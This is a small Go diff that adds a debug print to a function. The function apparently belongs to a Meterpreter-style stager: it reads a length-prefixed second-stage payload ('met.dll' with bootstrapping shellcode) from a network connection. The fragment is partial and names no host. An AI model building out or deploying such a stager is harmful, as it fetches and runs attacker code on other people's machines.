@@ -29,6 +29,7 @@ func Connect(ip string, port string) (bool, error) {
 	}
 	// read exactly size bytes
 	s2length := int(binary.LittleEndian.Uint32(length[:]))
+	fmt.Printf("Expecting %d bytes\n", s2length)
 	s2buf, err := ioutil.ReadAll(io.LimitReader(conn, int64(s2length)))
 	log.Printf("Read %d bytes\n", len(s2buf))
 	// met.dll is a dll that has shellcode at the beginning that will bootstrap itself
